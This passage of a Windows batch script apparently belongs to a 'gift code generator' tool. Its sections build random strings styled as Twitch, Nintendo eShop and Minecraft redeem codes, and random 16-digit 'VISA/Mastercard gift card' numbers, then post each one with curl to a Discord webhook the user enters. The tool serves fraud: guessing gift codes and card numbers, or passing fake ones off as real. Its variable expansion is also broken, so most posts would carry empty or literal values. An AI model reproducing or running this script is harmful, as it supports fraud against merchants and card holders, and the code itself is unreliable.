    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.twitch.tv/redeem/%code%\"}" %webhook%
)

goto twitchprimegen_loop

:nintendoeshopgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Nintendo eShop codes: "

:nintendoeshopgen_loop
set /p "num_codes=Enter the number of Nintendo eShop codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.nintendo.com/en_US/shop/redeem/%code%\"}" %webhook%
)

goto nintendoeshopgen_loop

:minecraftgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=25"

set /p "webhook=Enter Discord webhook URL for Minecraft gift codes: "

:minecraftgen_loop
set /p "num_codes=Enter the number of Minecraft gift codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.minecraft.net/redeem/%code%\"}" %webhook%
)

goto minecraftgen_loop
:visamastercardgen
@echo off
setlocal
set "characters=0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for VISA/Mastercard gift cards: "

:visamastercardgen_loop
set /p "num_cards=Enter the number of VISA/Mastercard gift cards to generate (0 to exit): "
if %num_cards% equ 0 goto menu

for /l %%n in (1,1,%num_cards%) do (
    set "card_number="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 10"
        for %%j in (!rand_idx!) do set "digit=!characters:~%%j,1!"
        set "card_number=!card_number!!digit!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"VISA/Mastercard Gift Card Number: %card_number%\"}" %webhook%
)

goto visamastercardgen_loop
